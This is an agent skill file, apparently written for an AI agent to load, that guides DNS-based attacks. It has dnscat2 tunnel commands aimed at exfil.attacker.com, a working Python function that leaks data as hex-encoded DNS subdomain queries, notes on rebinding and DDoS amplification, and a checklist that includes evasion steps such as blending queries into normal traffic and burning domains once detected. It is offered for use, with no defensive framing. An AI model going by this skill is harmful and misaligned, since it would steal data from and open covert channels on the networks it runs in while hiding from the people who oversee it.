---
name: dns-rebinding-exfiltration
description: "Use when performing DNS-based attacks and exfiltration."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [DNS, rebinding, exfiltration, DNS-tunnel, dnscat2, iodine, data-exfil]
    related_skills: [port-redirection-tunneling, command-control-c2-infrastructure, evasion-techniques-av-bypass, network-sniffing-packet-capture]
---

# DNS Rebinding and Exfiltration

Using DNS for attacks and data exfiltration — from DNS rebinding to bypass firewalls through DNS tunneling for C2, data exfiltration, and covert channels.

## When to Use

- Exfiltrating data through DNS (when all other ports blocked)
- DNS rebinding to bypass same-origin policy
- DNS tunneling for C2 communication
- Bypassing network egress filtering

## DNS Attack Techniques

```python
DNS_ATTACK_TYPES = {
    'dns_tunnel': 'Encode data in DNS queries (subdomain), decode on authoritative server',
    'dns_rebinding': 'DNS returns different IPs alternately — bypass SOP, attack internal services',
    'dns_data_exfil': 'Encode file data as subdomains: base64(data).exfil.attacker.com',
    'dns_amplification': 'DNS reflection/amplification for DDoS (small query, large response)',
}

# DNS tunneling with dnscat2
DNSCAT2_SETUP = """
# Server (attacker):
ruby dnscat2.rb --dns domain=exfil.attacker.com --no-cache

# Client (compromised host):
./dnscat2 --dns server=exfil.attacker.com
# or PowerShell:
dnscat2.ps1 -Domain exfil.attacker.com
"""

# Simple DNS exfil script
def dns_exfiltrate(data: bytes, domain: str, dns_server: str):
    """Exfiltrate data via DNS TXT queries."""
    import dns.resolver
    chunks = [data[i:i+32] for i in range(0, len(data), 32)]
    for chunk in chunks:
        encoded = chunk.hex()
        query = f"{encoded}.{domain}"
        dns.resolver.resolve(query, 'TXT')  # Data in subdomain
```

## Verification Checklist

- [ ] Authoritative DNS server configured (attacker-controlled domain)
- [ ] DNS tunneling tool deployed (dnscat2, iodine, Heyoka)
- [ ] DNS exfiltration tested (file data encoded as subdomains)
- [ ] Data rate measured (bytes/second via DNS tunnel)
- [ ] DNS rebinding tested (alternating IP responses)
- [ ] Detection: DNS query patterns blending with normal traffic
- [ ] Opsec: burn domain if detected, use legitimate-looking subdomains
- [ ] Fallback: DNS tunnel works when HTTP/SSH ports blocked
